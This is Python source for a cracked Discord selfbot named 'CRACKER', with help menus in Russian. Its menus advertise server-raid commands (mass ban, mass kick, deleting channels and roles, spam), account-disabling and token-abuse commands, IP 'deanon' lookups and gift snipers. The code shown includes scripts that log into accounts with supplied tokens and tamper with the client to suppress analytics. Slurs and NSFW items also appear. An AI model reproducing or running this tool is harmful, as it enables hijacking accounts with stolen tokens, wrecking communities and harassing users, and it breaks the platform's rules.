import discord
import char
from requests import get
import subprocess
import sys
import time
import os
import colorama
import base64
import codecs
import datetime
import io
import random
import upsidedown
import numpy
import datetime
import smtplib
import string
import ctypes
import urllib.parse
import urllib.request
import re
import json
import requests
import requests as rq
import webbrowser
import aiohttp
import asyncio
import functools
import logging
import textwrap
from traceback import format_exception
from os import system, name
from discord import Permissions

from discord.ext import (
    commands,
    tasks
)
from bs4 import BeautifulSoup as bs4
from urllib.parse import urlencode
from pymongo import MongoClient
# from selenium import webdriver
from threading import Thread
from subprocess import call
from itertools import cycle
from colorama import Fore
from sys import platform
# from PIL import Image
import pyPrivnote as pn
from gtts import gTTS


class SELFBOT():
    __linecount__ = 1933
    __version__ = 3.6


'''
Расположение частей кода по строкам(содержание).
'''


spam_message = "@everyone " + '\n' * 1996

# ctypes.windll.kernel32.SetConsoleTitleW(
    # f'[CRACKER SelfBot v{SELFBOT.__version__}] | Загрузка...')

with open('config.json') as f:
    config = json.load(f)
token = config.get('token')
password = config.get('password')
prefix = config.get('prefix')
giveaway_sniper = True
slotbot_sniper = True
nitro_sniper = True
privnote_sniper = True

stream_url = True
tts_language = config.get('tts_language')

bitly_key = config.get('bitly_key')
cat_key = config.get('cat_key')
weather_key = config.get('weather_key')
cuttly_key = config.get('cuttly_key')

width = os.get_terminal_size().columns
# hwid = subprocess.check_output(
    # 'wmic csproduct get uuid').decode().split('\n')[1].strip()
start_time = datetime.datetime.utcnow()
loop = asyncio.get_event_loop()

intents = discord.Intents.all()
Alucard = commands.Bot(command_prefix=commands.when_mentioned_or(
    ">", "x", "$", "-", "a", "^", "!"), description='CRACKER', intents=intents)

Alucard.autodm = False
Alucard.autodmmsg = 'Im currently sleeping'
Alucard.antiraid = False
Alucard.msgsniper = True
Alucard.slotbot_sniper = True
Alucard.giveaway_sniper = True
Alucard.talkcute = True
Alucard.donotdisturb = False
Alucard.mee6 = False
Alucard.mee6_channel = None
Alucard.yui_kiss_user = None
Alucard.yui_kiss_channel = None
Alucard.yui_hug_user = None
Alucard.yui_hug_channel = None
Alucard.snipe_history_dict = {}
Alucard.sniped_message_dict = {}
Alucard.sniped_edited_message_dict = {}
Alucard.whitelisted_users = {}
Alucard.copycat = None

languages = {
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}

locales = [
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

m_numbers = [
    ":one:",
    ":two:",
    ":three:",
    ":four:",
    ":five:",
    ":six:"
]

m_offets = [
    (-1, -1),
    (0, -1),
    (1, -1),
    (-1, 0),
    (1, 0),
    (-1, 1),
    (0, 1),
    (1, 1)
]


def startprint():
    if giveaway_sniper == True:
        giveaway = "Active"
    else:
        giveaway = "Disabled"

    if nitro_sniper == True:
        nitro = "Active"
    else:
        nitro = "Disabled"

    if slotbot_sniper == True:
        slotbot = "Active"
    else:
        slotbot = "Disabled"

    if privnote_sniper == True:
        privnote = "Active"
    else:
        privnote = "Disabled"

    print(f'''{Fore.RESET}

                                ░█████╗░██████╗░░█████╗░░█████╗░██╗░░██╗███████╗██████╗░
                                ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██╔════╝██╔══██╗
                                ██║░░╚═╝██████╔╝███████║██║░░╚═╝█████═╝░█████╗░░██████╔╝
                                ██║░░██╗██╔══██╗██╔══██║██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
                                ╚█████╔╝██║░░██║██║░░██║╚█████╔╝██║░╚██╗███████╗██║░░██║
                                ░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝

                                {Fore.CYAN}VERSION:{Fore.GREEN} v{SELFBOT.__version__}(not official)
                                {Fore.CYAN}Вошёл как:{Fore.GREEN} {Alucard.user.name}#{Alucard.user.discriminator}
                                {Fore.CYAN}ID: {Fore.GREEN}{Alucard.user.id}
                                {Fore.CYAN}Prefix: {Fore.GREEN}{prefix}
                                {Fore.CYAN}Cracked by: {Fore.GREEN}JKtimosha#7291
                                {Fore.CYAN}info: {Fore.GREEN}More cracks in our discord server: https://discord.gg/de4VRvr5ab




    '''+Fore.RESET)

def Clear():
    if name == "nt":
        _ = system("cls")
    else:
        _ = system("clear")


Clear()


def Init():
    if config.get('token') == "token-here":
        Clear()
        print(
            f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your token in the config.json file"+Fore.RESET)
    else:
        token = config.get('token')
        try:
            Alucard.run(token, bot=False, reconnect=True)
            os.system(
                f'title (Alucard Selfbot) - Version {SELFBOT.__version__}')
        except discord.errors.LoginFailure:
            print(
                f"{Fore.RED}[ERROR] {Fore.YELLOW}Improper token has been passed"+Fore.RESET)
            os.system('pause >NUL')


def GenAddress(addy: str):
    letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    four_char = ''.join(random.choice(letters) for _ in range(4))
    should_abbreviate = random.randint(0, 1)
    if should_abbreviate == 0:
        if "street" in addy.lower():
            addy = addy.replace("Street", "St.")
            addy = addy.replace("street", "St.")
        elif "st." in addy.lower():
            addy = addy.replace("st.", "Street")
            addy = addy.replace("St.", "Street")
        if "court" in addy.lower():
            addy = addy.replace("court", "Ct.")
            addy = addy.replace("Court", "Ct.")
        elif "ct." in addy.lower():
            addy = addy.replace("ct.", "Court")
            addy = addy.replace("Ct.", "Court")
        if "rd." in addy.lower():
            addy = addy.replace("rd.", "Road")
            addy = addy.replace("Rd.", "Road")
        elif "road" in addy.lower():
            addy = addy.replace("road", "Rd.")
            addy = addy.replace("Road", "Rd.")
        if "dr." in addy.lower():
            addy = addy.replace("dr.", "Drive")
            addy = addy.replace("Dr.", "Drive")
        elif "drive" in addy.lower():
            addy = addy.replace("drive", "Dr.")
            addy = addy.replace("Drive", "Dr.")
        if "ln." in addy.lower():
            addy = addy.replace("ln.", "Lane")
            addy = addy.replace("Ln.", "Lane")
        elif "lane" in addy.lower():
            addy = addy.replace("lane", "Ln.")
            addy = addy.replace("lane", "Ln.")
    random_number = random.randint(1, 99)
    extra_list = ["Apartment", "Unit", "Room"]
    random_extra = random.choice(extra_list)
    return four_char + " " + addy + " " + random_extra + " " + str(random_number)


def async_executor():
    def outer(func):
        @functools.wraps(func)
        def inner(*args, **kwargs):
            thing = functools.partial(func, *args, **kwargs)
            return loop.run_in_executor(None, thing)
        return inner
    return outer


@async_executor()
def do_tts(message):
    f = io.BytesIO()
    tts = gTTS(text=message.lower(), lang=tts_language)
    tts.write_to_fp(f)
    f.seek(0)
    return f


def Dump(ctx):
    for member in ctx.guild.members:
        f = open(f'Images/{ctx.guild.id}-Dump.txt', 'a+')
        f.write(str(member.avatar_url)+'\n')


def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'


def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor


def RandString(st):
    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(st))


colorama.init()
Alucard = discord.Client()
Alucard = commands.Bot(
    description='CRACKER Selfbot',
    command_prefix=prefix,
    self_bot=True
)
Alucard.remove_command('help')


'''
Все help команды.
'''


@Alucard.command(pass_context=True)
async def help(ctx):
    help_text = f'''
```css

╭━━━┳━━━┳━━━┳━━━┳╮╭━┳━━━┳━━━╮
┃╭━╮┃╭━╮┃╭━╮┃╭━╮┃┃┃╭┫╭━━┫╭━╮┃
┃┃╱╰┫╰━╯┃┃╱┃┃┃╱╰┫╰╯╯┃╰━━┫╰━╯┃
┃┃╱╭┫╭╮╭┫╰━╯┃┃╱╭┫╭╮┃┃╭━━┫╭╮╭╯
┃╰━╯┃┃┃╰┫╭━╮┃╰━╯┃┃┃╰┫╰━━┫┃┃╰╮
╰━━━┻╯╰━┻╯ ╰┻━━━┻╯╰━┻━━━┻╯╰━╯


[ {ctx.prefix}Fun ] - весёлости и развлечения.
[ {ctx.prefix}Reaction ] - команды взаимодействия с участниками.
[ {ctx.prefix}Nsfw ] - порно команды.
[ {ctx.prefix}Mod ] - команды модерации.
[ {ctx.prefix}Crash ] - команды краша.
[ {ctx.prefix}Text ] - команды работы с текстом и сообщениями.
[ {ctx.prefix}Token ] - команды работы с токенами.
[ {ctx.prefix}Tools ] - полезные инструменты.
[ {ctx.prefix}Animals ] - команды с животными.
[ {ctx.prefix}Status ] - команды статуса.
[ {ctx.prefix}Games ] - всякие игры.
```

**[Мой сервер](https://discord.gg/D3RrMqJKJ5)**

```css
# CRACKER
```
'''

    embed = discord.Embed(
        description=help_text,
        color=0xff0000
    )
    await ctx.send(embed=embed)


@Alucard.command()
async def Text(ctx):

    text_text = f'''

```css

[ CRACKER ]

<> - Обязательный параметр.  [] - необязательный параметр.

[ {ctx.prefix}vape <Текст> ] -  делает пропуски между буквами капсом.
[ {ctx.prefix}animate <Текст> ] - делает сообщение анимированным.
[ {ctx.prefix}reverse <Текст> ] - пишет текст наоборот.
[ {ctx.prefix}destroy <Кол-во> ] -  взрыв выбранного количества сообщений.
[ {ctx.prefix}spoiler <Текст> ] - спойлерит все сообщение.
[ {ctx.prefix}spoiler1 <Текст> ] - спойлерит каждую букву отдельно.
[ {ctx.prefix}spoiler2 <Текст> ] - спойлерит каждую букву отдельно, но не спойлерит пробелы.
[ {ctx.prefix}aboba <Кол-во сообщений> ] - меняет определённое количество ваших сообщений на абобу.
[ {ctx.prefix}s <Текст> ] - пишет сообщение от имени бота.
[ {ctx.prefix}edit <кол-во> <Текст> ] - редактирует введённое количество ваших сообщения на введенный текст.
```

**[Мой сервер](https://discord.gg/D3RrMqJKJ5)**

```css
# CRACKER
```
'''

    embed = discord.Embed(
        title='Команды текста.',
        description=text_text,
        color=0xff0000
    )

    await ctx.send(embed=embed)


@Alucard.command()
async def Fun(ctx):

    fun_text = f'''

```css

[ CRACKER ]

<> - Обязательный параметр.  [] - необязательный параметр.

[ {ctx.prefix}reacts <кол-во сообщений | эмодзи> ] - ставит выбранную реакцию на определённое кол-во сообщений.
[ {ctx.prefix}flex ] - танцы в чате.
[ {ctx.prefix}fbi [@Ping | ID] - упомятого участника повяжет ФСБ.
[ {ctx.prefix}gay <@Ping | ID> ] - оскорбить участника.
[ {ctx.prefix}boom ] - взрывное сообщение.
[ {ctx.prefix}fleshka ] - кинуть ослепляющую гранату на сервер.
[ {ctx.prefix}animatenick <Новый ник> ] - сделайте себе анимированный ник.
[ {ctx.prefix}stopanimatenick ] - остановить анимацию ника.
[ {ctx.prefix}thanos ] - щелчок таноса.
[ {ctx.prefix}joke ] - шутка.
[ {ctx.prefix}dick <упоминание> ] - член упомянутого юзера.
[ {ctx.prefix}combine <ник1> <ник2> ] - комбинирует 2 ника.
[ {ctx.prefix}say <текст> ] - отпвряет текст в рамочке, заменяет некоторые буквы цифрами.
[ {ctx.prefix}tweet <имя> <текст> ] - создаст твит с указанным автором и текстом.
```

**[Мой сервер](https://discord.gg/D3RrMqJKJ5)**

```css
# CRACKER
```
'''

    embed = discord.Embed(
        title='Весёлости и развлечения.',
        description=fun_text,
        color=0xff0000
    )

    await ctx.send(embed=embed)


@Alucard.command()
async def Games(ctx):

    fun_text = f'''

```css

[ CRACKER ]

<> - Обязательный параметр.  [] - необязательный параметр.

[ {ctx.prefix}minesweeper <размер поля> ] - сапер.
[ {ctx.prefix}slot ] - слоты.
```

**[Мой сервер](https://discord.gg/D3RrMqJKJ5)**

```css
# CRACKER
```
'''

    embed = discord.Embed(
        title='игры.',
        description=fun_text,
        color=0xff0000
    )

    await ctx.send(embed=embed)


@Alucard.command()
async def Reaction(ctx):

    react_text = f'''

```css

[ CRACKER ]

<> - обязательный параметр.  [] - необязательный параметр.

[ {ctx.prefix}kiss [@Ping | ID] - поцеловать участника.
[ {ctx.prefix}poke [@Ping | ID] - тыкнуть участника.
[ {ctx.prefix}sex  [@Ping | ID] - заняться с участником сексом.
[ {ctx.prefix}pet  [@Ping | ID] - погладить участника.
[ {ctx.prefix}hit  [@Ping | ID] - ударить участника.
[ {ctx.prefix}kill [@Ping | ID] - убить участника.
```

**[Мой сервер](https://discord.gg/D3RrMqJKJ5)**

```css
# CRACKER
```

'''

    embed = discord.Embed(
        title='Команды взаимодействия с участниками.',
        description=react_text,
        color=0xff0000
    )

    await ctx.send(embed=embed)


@Alucard.command()
async def Nsfw(ctx):

    nsfw_text = f'''
```css

[ CRACKER ]

<> - Обязательный параметр.  [] - необязательный параметр.

[ {ctx.prefix}cum ] - секс со шлюхой.
[ {ctx.prefix}lesbian ] - лесбиянки.
[ {ctx.prefix}anal ] - анальные развлечения.
[ {ctx.prefix}tits ] - большие сиськи.
[ {ctx.prefix}blowjob ] - минет.
```

**[Мой сервер](https://discord.gg/D3RrMqJKJ5)**

```css
# CRACKER
```
'''

    embed = discord.Embed(
        title='NSFW команды.',
        description=nsfw_text,
        color=0xff0000
    )

    await ctx.send(embed=embed)


@Alucard.command()
async def Mod(ctx):

    mod_text = f'''
```css

[ CRACKER ]

<> - Обязательный параметр.  [] - необязательный параметр.

[ {ctx.prefix}ban <@Ping | ID> ] - забанить участника.
[ {ctx.prefix}kick <@Ping | ID> ] - кикнуть пользователя.
```

**[Мой сервер](https://discord.gg/D3RrMqJKJ5)**

```css
# CRACKER
```
'''

    embed = discord.Embed(
        title='Команды модерации.',
        description=mod_text,
        color=0xff0000
    )

    await ctx.send(embed=embed)


@Alucard.command()
async def Crash(ctx):

    crash_text = f'''

```css

[ CRACKER ]

<> - Обязательный параметр.  [] - необязательный параметр.

[ {ctx.prefix}auto ] - автоматический краш сервера.
[ {ctx.prefix}spamls <@Ping | ID> <текст> ] - спам в лс упомянутому участнику.
[ {ctx.prefix}banall ] - забанить всех участников на сервере.
[ {ctx.prefix}kickall ] - кик всех участников на сервере.
[ {ctx.prefix}admineveryone ] - админка всем участникам на сервера.
[ {ctx.prefix}spamchannels ] - спам множеством каналов.
[ {ctx.prefix}ghostspam ] - невидимый спам.
[ {ctx.prefix}delchannels ] - удалить все каналы на сервере.
[ {ctx.prefix}rolespam ] - спам множеством ролей.
[ {ctx.prefix}delroles ] - удаление всех ролей на сервере.
```

**[Мой сервер](https://discord.gg/D3RrMqJKJ5)**

```css
# CRACKER
```
'''

    embed = discord.Embed(
        title='Команды краша.',
        description=crash_text,
        color=0xff0000
    )

    await ctx.send(embed=embed)


@Alucard.command()
async def Status(ctx):

    status_text = f'''

```css

[ CRACKER ]

<> - Обязательный параметр.  [] - необязательный параметр.

[ {ctx.prefix}stream <stream_name> ] - отоброжает статус "Стримит <указанное название>".
[ {ctx.prefix}listening <listening_name> ] - отоброжает статус "Слушает <указанное название>".
[ {ctx.prefix}competing <competing_name> ] - отоброжает статус "Соревнуеться <указанное название>".
[ {ctx.prefix}watching <watching_name> ] - отоброжает статус "Смотрит <указанное название>".
[ {ctx.prefix}chp ] - отоброжает статус "Стримит <курс BTC в USD>".
```

**[Мой сервер](https://discord.gg/D3RrMqJKJ5)**

```css
# CRACKER
```
'''

    embed = discord.Embed(
        title='Команды статуса.',
        description=status_text,
        color=0xff0000
    )

    await ctx.send(embed=embed)


@Alucard.command()
async def Animals(ctx):

    status_text = f'''

```css

[ CRACKER ]

<> - Обязательный параметр.  [] - необязательный параметр.

[ {ctx.prefix}sadcat ] - грустный котёнок.
[ {ctx.prefix}cat ] - кот.
[ {ctx.prefix}dog ] - собака.
[ {ctx.prefix}fox ] - лиса.
```

**[Мой сервер](https://discord.gg/D3RrMqJKJ5)**

```css
# CRACKER
```
'''

    embed = discord.Embed(
        title='Животные.',
        description=status_text,
        color=0xff0000
    )

    await ctx.send(embed=embed)


@Alucard.command()
async def Info(ctx):

    react_text = f'''

```css

[ CRACKER ]

<> - обязательный параметр.  [] - необязательный параметр.

[ {ctx.prefix}user_info [@Ping | ID] - Посмотреть профиль.
[ {ctx.prefix}server_info ] - Информация о сервере.
[ {ctx.prefix}emoji_info  [Эмодзи] - Инфо о эмодзи.
[ {ctx.prefix}role_info  [@Ping] - Инфо о роли.
[ {ctx.prefix}av <упоминание юзера> ] - получает и отпрвляет аватарку упомянутого юзера.
[ {ctx.prefix}revav <упоминание юзера> ] - исчет автарку упомянутого юзера в гугле.

```

**[Мой сервер](https://discord.gg/D3RrMqJKJ5)**

```css
# CRACKER
```

'''

    embed = discord.Embed(
        title='Информация о всяком',
        description=react_text,
        color=0xff0000
    )

    await ctx.send(embed=embed)


@Alucard.command()
async def Deanon(ctx):

    react_text = f'''

```css

[ CRACKER ]

<> - обязательный параметр.  [] - необязательный параметр.

[ {ctx.prefix}geoip <ip> ] - данные по айпи адресу.

```

**[Мой сервер](https://discord.gg/D3RrMqJKJ5)**

```css
# CRACKER
```

'''

    embed = discord.Embed(
        title='Деаноним пидоров',
        description=react_text,
        color=0xff0000
    )

    await ctx.send(embed=embed)


@Alucard.command()
async def Tools(ctx):

    status_text = f'''

```css

[ CRACKER ]

<> - Обязательный параметр.  [] - необязательный параметр.

[ {ctx.prefix}lmgtfy <запрос> ] - поисковой запрос на сайте lmgtfy.com.
[ {ctx.prefix}encode <текст на английском> ] - кодирует введенное сообщение.
[ {ctx.prefix}decode <закодированный текст> ] - декодирует введенное сообщение.
[ {ctx.prefix}voicespam ] - перекидывает вас и участников голосового чата(надо быть в голосовом чате).
[ {ctx.prefix}geoip <ip адрес> ] - информация по ip.
[ {ctx.prefix}clone ] - клонирование сервера.
[ {ctx.prefix}invisible ] - делает ваш ник на сервере невидимым.
[ {ctx.prefix}purge <Кол-Во сообщений> ] - удаления определённого количества ваших сообщений.
[ {ctx.prefix}bitly <ссылка> ] - сокращает ссылку.
[ {ctx.prefix}hypesquad <тип> ] - меняет значек на вашем аккаунте.
```

**[Мой сервер](https://discord.gg/D3RrMqJKJ5)**

```css
# CRACKER
```
'''

    embed = discord.Embed(
        title='Полезные инструменты.',
        description=status_text,
        color=0xff0000
    )

    await ctx.send(embed=embed)


@Alucard.command()
async def Token(ctx):

    status_text = f'''

```css

[ CRACKER ]

<> - Обязательный параметр.  [] - необязательный параметр.


[ {ctx.prefix}login <token> ] - заходит на акк по токену.
[ {ctx.prefix}botlogin <token> ] - заходит на акк бота по токену.
[ {ctx.prefix}tokenddos <token> ] - быстро меняет настройки акканта.
[ {ctx.prefix}disabler <token> ] - банит аккаунт по токену.
[ {ctx.prefix}disablerv2 <token> ] - банит аккаунт по токену v2.
[ {ctx.prefix}hypesquad1 <token> <тип>] - меняет значек на указнном аккаунте.
```

**[Мой сервер](https://discord.gg/D3RrMqJKJ5)**

```css
# CRACKER
```
'''

    embed = discord.Embed(
        title='Команды токенов.',
        description=status_text,
        color=0xff0000
    )

    await ctx.send(embed=embed)
'''
инфо
'''


@Alucard.command()
async def revav(ctx, user: discord.Member = None):  # b'\xfc'
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    try:
        em = discord.Embed(
            description=f"https://images.google.com/searchbyimage?image_url={user.avatar_url}")
        await ctx.send(embed=em)
    except Exception as e:
        embed = discord.Embed(
            description=f"{e}",
            color=0xff0000
        )
        await ctx.send(f"*Произошла ошибка:*", embed=embed)


@Alucard.command(
aliases=['server-info', 'server', 'Сервер', 'сервер'])
async def server_info(ctx):
        members = ctx.guild.members
        online = len(
            list(filter(lambda x: x.status == discord.Status.online, members)))
        offline = len(
            list(filter(lambda x: x.status == discord.Status.offline, members)))
        idle = len(
            list(filter(lambda x: x.status == discord.Status.idle, members)))
        dnd = len(list(filter(lambda x: x.status == discord.Status.dnd, members)))
        allchannels = len(ctx.guild.channels)
        allvoice = len(ctx.guild.voice_channels)
        alltext = len(ctx.guild.text_channels)
        allroles = len(ctx.guild.roles)
        embed = discord.Embed(
            title=f"{ctx.guild.name}",
            colour=0xffde0a,
            timestamp=ctx.message.created_at)
        embed.description = (
            f"•:timer: Время создания севрера: **{ctx.guild.created_at.strftime('%A, %b %#d %Y')}**\n\n"
            f"•:flag_white: **Регион** `{ctx.guild.region}`\n\n •**Овнер** `{ctx.guild.owner}`\n\n"
      f"•:busts_in_silhouette: ** на сервере** `{ctx.guild.member_count}`\n\n"
            f"•:shield: **Уровень верификации:** `{ctx.guild.verification_level}`\n\n"
            f"•:dividers:  **Всего каналов:** `{allchannels}`\n\n"
            f"•:loud_sound: **Голосовых каналов:** `{allvoice}`\n\n"
            f"•:keyboard: **Текстовых каналов:** `{alltext}`\n\n"
            f"•:briefcase: **Всего ролей:** `{allroles}`\n\n"
        )
        embed.set_thumbnail(
            url=ctx.guild.icon_url)
        embed.set_footer(
            text=f"ID: {ctx.guild.id}")
        embed.set_footer(
            text='CRACKER© Copyright 2021 | Все права защищены',
            icon_url='https://cdn.discordapp.com/avatars/690149608403370032/79464ba1a835bf756799d2b9326497e1.webp?size=1024')
        await ctx.send(embed=embed)


@Alucard.command(aliases=['pfp', 'avatar'])
async def av(ctx, *, user: discord.Member = None):  # b'\xfc'
    await ctx.message.delete()
    format = "gif"
    user = user or ctx.author
    if user.is_avatar_animated() != True:
        format = "png"
    avatar = user.avatar_url_as(format=format if format != "gif" else None)
    async with aiohttp.ClientSession() as session:
        async with session.get(str(avatar)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as file:
        await ctx.send(file=discord.File(file, f"Avatar.{format}"))


@Alucard.command()
async def user_info(ctx, member: discord.Member = None, guild: discord.Guild = None):
    await ctx.message.delete()
    if member == None:
        emb = discord.Embed(title="Информация о пользователе",
                            color=ctx.message.author.color)
        emb.add_field(
            name="Имя:", value=ctx.message.author.display_name, inline=False)
        emb.add_field(name="Айди пользователя:",
                      value=ctx.message.author.id, inline=False)
        t = ctx.message.author.status
        if t == discord.Status.online:
            d = "🟢 В сети"

        elif t == discord.Status.offline:
            d = "⚪ Не в сети"

        elif t == discord.Status.idle:
            d = "🔴 Не активен"

        elif t == discord.Status.dnd:
            d = "🟡 Не беспокоить"

        emb.add_field(name="Активность:", value=d, inline=False)
        emb.add_field(name="Статус:",
                      value=ctx.message.author.activity, inline=False)
        emb.add_field(name="Роль на сервере:",
                      value=f"{ctx.message.author.top_role.mention}", inline=False)
        emb.add_field(name="Акаунт был создан:", value=ctx.message.author.created_at.strftime(
            "%a, %#d %B %Y, %I:%M %p UTC"), inline=False)
        emb.set_thumbnail(url=ctx.message.author.avatar_url)
        await ctx.send(embed=emb)

    else:
        emb = discord.Embed(
            title="Информация о пользователе", color=member.color)
        emb.add_field(name="Имя:", value=member.display_name, inline=False)
        emb.add_field(name="Айди пользователя:", value=member.id, inline=False)
        t = member.status
        if t == discord.Status.online:
            d = "🟢 В сети"

        elif t == discord.Status.offline:
            d = "⚪ Не в сети"

        elif t == discord.Status.idle:
            d = "🔴 Не активен"

        elif t == discord.Status.dnd:
            d = "🟡 Не беспокоить"
        emb.add_field(name="Активность:", value=d, inline=False)
        emb.add_field(name="Статус:", value=member.activity, inline=False)
        emb.add_field(name="Роль на сервере:",
                      value=f"{member.top_role.mention}", inline=False)
        emb.add_field(name="Акаунт был создан:", value=member.created_at.strftime(
            "%a, %#d %B %Y, %I:%M %p UTC"), inline=False)
        await ctx.send(embed=emb)


@Alucard.command(aliases=['ri', 'role'])
async def role_info(ctx, *, role: discord.Role):  # b'\xfc'
    await ctx.message.delete()
    guild = ctx.guild
    since_created = (ctx.message.created_at - role.created_at).days
    role_created = role.created_at.strftime("%d %b %Y %H:%M")
    created_on = "{} ({} days ago)".format(role_created, since_created)
    users = len([x for x in guild.members if role in x.roles])
    if str(role.colour) == "#000000":
        colour = "default"
        color = ("#%06x" % random.randint(0, 0xFFFFFF))
        color = int(colour[1:], 16)
    else:
        colour = str(role.colour).upper()
        color = role.colour
    em = discord.Embed(colour=color)
    em.set_author(name=f"Name: {role.name}"
                  f"\nRole ID: {role.id}")
    em.add_field(name="Users", value=users)
    em.add_field(name="Mentionable", value=role.mentionable)
    em.add_field(name="Hoist", value=role.hoist)
    em.add_field(name="Position", value=role.position)
    em.add_field(name="Managed", value=role.managed)
    em.add_field(name="Colour", value=colour)
    em.add_field(name='Creation Date', value=created_on)
    await ctx.send(embed=em)


@Alucard.command(
        aliases=['emoji-info', 'Emoji-info', 'Эмодзи-инфо', 'эмодзи-инфо'])
async def emoji_info(ctx, emoji: discord.Emoji = None):
        if emoji is None:
            await ctx.send(embed=discord.Embed(
                description=f':x:**{ctx.author.name}** введите эмодзи',
                colour=0xffde0a))
        else:
            embed = discord.Embed(
                description=f"[Эмодзи]({emoji.url}) сервера {emoji}",
                colour=0xffde0a)
            embed.add_field(
                name="Имя:",
                value=f"`{emoji.name}`")
            embed.add_field(
                name="‎‎‎‎",
                value="‎‎‎‎")
            embed.add_field(
                name="Время добавления:",
                value=f"`{emoji.created_at}`")
            embed.add_field(
                name="ID эмодзи:",
                value=f"`{emoji.id}`")
            embed.add_field(
                name="‎‎‎‎",
                value="‎‎‎‎")
            embed.set_thumbnail(
                url=f"{emoji.url}")
            await ctx.send(embed=embed)

'''
токены
'''


@Alucard.command(aliases=['changehypesquad1'])
async def hypesquad1(ctx, token1, house):  # b'\xfc'
    await ctx.message.delete()
    request = requests.Session()
    headers = {
        'Authorization': token1,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }
    if house == "bravery":
        payload = {'house_id': 1}
    elif house == "brilliance":
        payload = {'house_id': 2}
    elif house == "balance":
        payload = {'house_id': 3}
    elif house == "random":
        houses = [1, 2, 3]
        payload = {'house_id': random.choice(houses)}
    try:
        request.post('https://discordapp.com/api/v6/hypesquad/online',
                     headers=headers, json=payload, timeout=10)
    except Exception as e:
        embed = discord.Embed(
            description=f"{e}",
            color=0xff0000
        )
        await ctx.send(f"*Произошла ошибка:*", embed=embed)


@Alucard.command()
async def login(ctx, _token):  # b'\xfc'
    await ctx.message.delete()
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }
            """
    driver.get("https://discordapp.com/login")
    driver.execute_script(script+f'\nlogin("{_token}")')


@Alucard.command()
async def botlogin(ctx, _token):  # b'\xfc'
    await ctx.message.delete()
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
    function login(token) {
      ((i) => {
        window.webpackJsonp.push([
          [i], {
            [i]: (n, b, d) => {
              let dispatcher;
              for (let key in d.c) {
                if (d.c[key].exports) {
                  const module = d.c[key].exports.default || d.c[key].exports;
                  if (typeof(module) === 'object') {
                    if ('setToken' in module) {
                      module.setToken(token);
                      module.hideToken = () => {};
                    }
                    if ('dispatch' in module && '_subscriptions' in module) {
                      dispatcher = module;
                    }
                    if ('AnalyticsActionHandlers' in module) {
                      console.log('AnalyticsActionHandlers', module);
                      module.AnalyticsActionHandlers.handleTrack = (track) => {};
                    }
                  } else if (typeof(module) === 'function' && 'prototype' in module) {
                    const descriptors = Object.getOwnPropertyDescriptors(module.prototype);
                    if ('_discoveryFailed' in descriptors) {
                      const connect = module.prototype._connect;
                      module.prototype._connect = function(url) {
                        console.log('connect', url);
                        const oldHandleIdentify = this.handleIdentify;
                        this.handleIdentify = () => {
                          const identifyData = oldHandleIdentify();
                          identifyData.token = identifyData.token.split(
                              ' ').pop();
                          return identifyData;
                        };
                        const oldHandleDispatch = this._handleDispatch;
                        this._handleDispatch = function(data, type) {
                          if (type === 'READY') {
                            console.log(data);
                            data.user.bot = false;
                            data.user.email = 'Alucard-Was-Here@Fuckyou.com';
                            data.analytics_tokens = [];
                            data.connected_accounts = [];
                            data.consents = [];
                            data.experiments = [];
                            data.guild_experiments = [];
                            data.relationships = [];
                            data.user_guild_settings = [];
                          }
                          return oldHandleDispatch.call(this, data, type);
                        }
                        return connect.call(this, url);
                      };
                    }
                  }
                }
              }
              console.log(dispatcher);
              if (dispatcher) {
                dispatcher.dispatch({
                  type: 'LOGIN_SUCCESS',
                  token
                });
              }
            },
          },
          [
            [i],
          ],
        ]);
      })(Math.random());
    }
    """
    driver.get("https://discordapp.com/login")
    driver.execute_script(script+f'\nlogin("Bot {_token}")')


@Alucard.command()
async def massunban(ctx):  # b'\xfc'
    await ctx.message.delete()
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass


@Alucard.command(aliases=['Tokenddos', 'TOKENDDOS'])
async def tokenddos(ctx, _token):
    error553 = f'''
```css
[ Если токен указан верно, процесс начнётся! ]
```
'''
    embed = discord.Embed(
        description=error553,
        color=0xff0000
    )
    await ctx.send('*Успех!*', embed=embed)
